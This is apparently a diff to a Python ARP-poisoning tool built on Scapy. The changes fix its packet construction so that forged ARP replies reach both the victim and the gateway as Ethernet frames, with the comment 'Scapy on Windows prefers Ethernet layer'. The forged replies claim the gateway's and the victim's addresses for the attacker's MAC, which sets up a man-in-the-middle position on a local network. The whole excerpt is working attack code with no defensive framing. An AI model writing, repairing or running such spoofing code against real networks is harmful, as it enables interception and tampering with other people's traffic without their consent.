@@ -62,26 +62,27 @@ class ARPPoisoner:
                 return
 
             # Tell the victim that we are the gateway.
-            victim_arp_poison = ARP(
+            # Fix: Scapy on Windows prefers Ethernet layer for MAC addressing correctness
+            victim_arp_poison = sc.Ether(dst=victim_mac) / ARP(
                 op=2,  # ARP reply
                 pdst=self.victim_ip,  # Destination is the victim
                 hwdst=victim_mac,
-                psrc=self.gateway_ip,  # Source is the gateway (we claim that)
-                hwsrc=self.attacker_mac  # But actually we send our own MAC address.
+                psrc=self.gateway_ip  # Source is the gateway (we claim that)
+                # hwsrc defaults to our interface mac
             )
 
             # Same for the gateway
-            gateway_arp_poison = ARP(
+            gateway_arp_poison = sc.Ether(dst=gateway_mac) / ARP(
                 op=2,  # ARP reply
                 pdst=self.gateway_ip,  # Destination is the gateway
                 hwdst=gateway_mac,
-                psrc=self.victim_ip,  # Source is the victim (we claim that)
-                hwsrc=self.attacker_mac  # But actually we send our own MAC address
+                psrc=self.victim_ip  # Source is the victim (we claim that)
+                # hwsrc defaults to our interface mac
             )
 
             # Send the poisoned packets
-            sc.send(victim_arp_poison, verbose=0, iface=self.interface)
-            sc.send(gateway_arp_poison, verbose=0, iface=self.interface)
+            sc.sendp(victim_arp_poison, verbose=0, iface=self.interface)
+            sc.sendp(gateway_arp_poison, verbose=0, iface=self.interface)
 
         except Exception as e:
             log(f"Error during ARP poisoning: {e}")
